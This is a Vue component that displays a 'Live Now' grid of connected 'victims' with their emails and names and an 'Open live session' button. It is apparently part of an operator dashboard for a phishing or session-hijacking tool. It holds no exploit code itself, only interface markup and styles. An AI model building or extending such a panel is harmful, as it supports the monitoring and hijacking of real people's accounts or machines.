<script setup>
import { computed } from 'vue'
import Button from 'primevue/button'

const props = defineProps({
    victims: {
        type: Array,
        required: true
    }
})

const emit = defineEmits(['select'])

const previewVictims = computed(() => props.victims.slice(0, 4))

function victimName(victim) {
    return [victim.first_name, victim.last_name].filter(Boolean).join(' ') || 'Active session'
}
</script>

<template>
    <div class="live-sessions">
        <div class="section-header">
            <h2 class="section-title">
                <i class="pi pi-circle-fill status-indicator"></i>
                Live Now
                <span class="count-badge">{{ victims.length }} active</span>
            </h2>
        </div>

        <div class="sessions-grid">
            <div
                v-for="victim in previewVictims"
                :key="victim.id"
                class="session-card"
                @click="emit('select', victim)"
            >
                <div class="session-icon" aria-hidden="true">
                    <i class="pi pi-desktop"></i>
                </div>
                <div class="victim-info">
                    <span class="victim-email">{{ victim.email }}</span>
                    <div class="victim-meta">
                        <span>{{ victimName(victim) }}</span>
                        <span class="connected-state">
                            <span class="status-dot active"></span>
                            Connected
                        </span>
                    </div>
                </div>
                <Button
                    icon="pi pi-arrow-right"
                    severity="secondary"
                    text
                    rounded
                    size="small"
                    class="monitor-btn"
                    v-tooltip.top="'Open live session'"
                    aria-label="Open live session"
                    @click.stop="emit('select', victim)"
                />
            </div>
        </div>
    </div>
</template>

<style scoped>
.live-sessions {
    background-color: var(--color-background-soft);
    border-radius: 8px;
    padding: 1.125rem;
}

.section-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 0.875rem;
}

.section-title {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-size: 1.125rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

.status-indicator {
    color: var(--success);
    font-size: 0.75rem;
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

.count-badge {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    padding: 0.25rem 0.625rem;
    background-color: var(--success-subtle);
    color: var(--success);
    border-radius: 12px;
    font-size: 0.75rem;
    font-weight: 600;
}

/* Sessions Grid */
.sessions-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
    gap: 0.625rem;
}

.session-card {
    position: relative;
    background-color: var(--color-background);
    border: 1px solid var(--color-border);
    border-radius: var(--radius-sm);
    padding: 0.75rem;
    cursor: pointer;
    transition: var(--transition-interactive);
    display: flex;
    align-items: center;
    gap: 0.625rem;
}

.session-card:hover {
    border-color: var(--color-border-hover);
}

.session-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    flex: 0 0 auto;
    width: 34px;
    height: 34px;
    border-radius: var(--radius-sm);
    background: var(--success-subtle);
    color: var(--success);
}

.session-icon i {
    font-size: 0.95rem;
}

.victim-info {
    display: flex;
    flex-direction: column;
    gap: 0.25rem;
    min-width: 0;
}

.victim-email {
    font-weight: 600;
    font-size: 0.9rem;
    color: var(--color-heading);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.victim-meta {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    overflow: hidden;
    font-size: 0.72rem;
    color: var(--color-text-mute);
    white-space: nowrap;
}

.victim-meta > span:first-child {
    overflow: hidden;
    text-overflow: ellipsis;
}

.connected-state {
    display: inline-flex;
    align-items: center;
    flex-shrink: 0;
    gap: 0.3rem;
    color: var(--success);
}

.status-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    flex-shrink: 0;
}

.status-dot.active {
    background-color: var(--success);
}

.monitor-btn {
    flex: 0 0 auto;
    margin-left: auto;
}

/* Responsive */
@media (max-width: 768px) {
    .sessions-grid {
        grid-template-columns: 1fr;
    }
}
</style>
